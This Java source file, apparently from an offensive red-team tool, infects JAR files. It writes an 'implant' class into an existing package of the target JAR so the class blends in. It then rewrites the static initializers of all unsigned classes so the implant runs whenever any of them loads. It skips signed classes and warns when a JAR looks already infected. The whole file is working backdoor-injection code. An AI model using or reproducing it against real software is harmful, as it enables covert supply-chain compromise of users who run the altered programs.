package org.example.injector;

import javassist.bytecode.*;

import java.io.DataInputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.file.Path;
import java.util.jar.JarEntry;

import static org.example.injector.Helpers.*;

public class ClassInjector {
    final static String IMPLANT_CLASS_NAME = "Init";
    private final ImplantHandler implantHandler;

    public ClassInjector(ImplantHandler implantHandler) {
        this.implantHandler = implantHandler;
    }

    public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
        ClassFile implantedClass = null;
        boolean foundSignedClasses = false;

        try (JarFileFiddler fiddler = JarFileFiddler.open(targetJarFilePath, outputJar)) {
            for (JarFileFiddler.WrappedJarEntry entry : fiddler) {
                if (!entry.getName().endsWith(".class")) {
                    entry.forward();
                    continue;
                }
                if (entry.getEntry().getCodeSigners() != null) {
                    foundSignedClasses = true;
                    entry.forward();
                    continue;
                }
                if (entry.getName().equals(IMPLANT_CLASS_NAME + ".class")) {
                    System.out.println("[-] WARNING: It looks like this JAR may already be infected. Proceeding anyway.");
                    entry.forward();
                    continue;
                }

                ClassFile currentlyProcessing;
                try (DataInputStream in = new DataInputStream(entry.getContent())) {
                    currentlyProcessing = new ClassFile(in);
                }

                String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
                if (implantedClass == null) {
                    /*
                     * Since there are other classes in this directory, the implant will blend in better here.
                     * Any directory will do and only one occurrence of the implant class in the JAR is enough.
                     */
                    ClassFile implant = implantHandler.loadFreshConfiguredSpecimen();
                    deepRenameClass(implant, targetPackageName, IMPLANT_CLASS_NAME);
                    JarEntry newJarEntry = convertToJarEntry(implant);
                    implant.write(fiddler.addNewEntry(newJarEntry));
                    System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");

                    implantedClass = implant;
                }

                /*
                 * As the class is now planted into the JAR, it must be referred to somehow (by anything running)
                 * in order to be loaded. Modify the class initializer (static block) of all eligible classes to
                 * explicitly use the implant class. The implant will thus be called upon once per class that is
                 * infected. Remember that a class initializer will run only once per class.
                 * Several classes are infected because it's difficult to know what specific class will be used
                 * by an app.
                 */
                modifyClinit(currentlyProcessing, implantedClass);
                currentlyProcessing.write(entry.replaceAndGetStream());
                System.out.println("[+] Modified class initializer for '" + currentlyProcessing.getName() + "'.");
            }

            if (foundSignedClasses) {
                System.out.println("[-] Found signed classes. These were not considered for infection.");
            }

            return implantedClass != null;
        }
    }

    private static void modifyClinit(ClassFile targetClass, ClassFile implantClass) {
        MethodInfo implantInitMethod = implantClass.getMethod("init");
        if (implantInitMethod == null) {
            throw new UnsupportedOperationException("Implant class does not have a 'public static init()' function.");
        }

        MethodInfo currentClinit = targetClass.getMethod(MethodInfo.nameClinit);
        if (currentClinit == null) {
            // The target does not already have a class initializer (aka <clinit>) to merge implant code into.
            // This is fine, but to make things a bit more streamlined, create an empty one first.
            try {
                currentClinit = createAndAddClassInitializerStub(targetClass);
            } catch (DuplicateMemberException e) {
                throw new RuntimeException("Internal error: <clinit> already exist despite not existing", e);
            }
        }

        // Modify the clinit method of the target class to run the implant method (before its own code)
        Bytecode additionalClinitCode = new Bytecode(targetClass.getConstPool());
        additionalClinitCode.addInvokestatic(implantClass.getName(), implantInitMethod.getName(), implantInitMethod.getDescriptor());
        CodeAttribute additionalClinitCodeAttr = additionalClinitCode.toCodeAttribute();
        CodeAttribute currentClinitCodeAttr = currentClinit.getCodeAttribute();
        ByteBuffer concatenatedCode = ByteBuffer.allocate(additionalClinitCodeAttr.getCodeLength() + currentClinit.getCodeAttribute().getCodeLength());
        concatenatedCode.put(additionalClinitCodeAttr.getCode());
        concatenatedCode.put(currentClinitCodeAttr.getCode());
        CodeAttribute newCodeAttribute = new CodeAttribute(targetClass.getConstPool(), currentClinitCodeAttr.getMaxStack(), currentClinitCodeAttr.getMaxLocals(), concatenatedCode.array(), currentClinitCodeAttr.getExceptionTable());
        currentClinit.setCodeAttribute(newCodeAttribute);
    }

    private static void deepRenameClass(ClassFile classFile, String newPackageName, String newClassName) {
        String newFqcn = newPackageName + "." + newClassName;
        String newSourceFileName = newClassName + ".java";

        AttributeInfo sourceFileAttr = classFile.getAttribute(SourceFileAttribute.tag);
        if (sourceFileAttr != null) {
            ByteBuffer sourceFileInfo = ByteBuffer.wrap(sourceFileAttr.get());
            sourceFileInfo.order(ByteOrder.BIG_ENDIAN);
            if (sourceFileInfo.limit() != 2) {
                throw new RuntimeException("Unexpected SourceFileAttribute length: " + sourceFileInfo.limit());
            }
            int fileNameIndex = sourceFileInfo.getShort();
            String fileName = classFile.getConstPool().getUtf8Info(fileNameIndex);
            String expectedName = parseClassNameFromFqcn(classFile.getName());
            if (!fileName.startsWith(expectedName)) {
                throw new RuntimeException("Unexpected SourceFileAttribute: Expected class to start with '" + expectedName + "'.");
            }
            int newClassNameIndex = classFile.getConstPool().addUtf8Info(newSourceFileName);
            if (newClassNameIndex < 0 || newClassNameIndex > 65535) {
                throw new RuntimeException("Unexpected index in ConstPool: " + newClassNameIndex);
            }
            sourceFileInfo.flip();
            sourceFileInfo.putShort((short) newClassNameIndex);
            sourceFileAttr.set(sourceFileInfo.array());
        }

        classFile.setName(newFqcn);
        classFile.compact();
    }
}
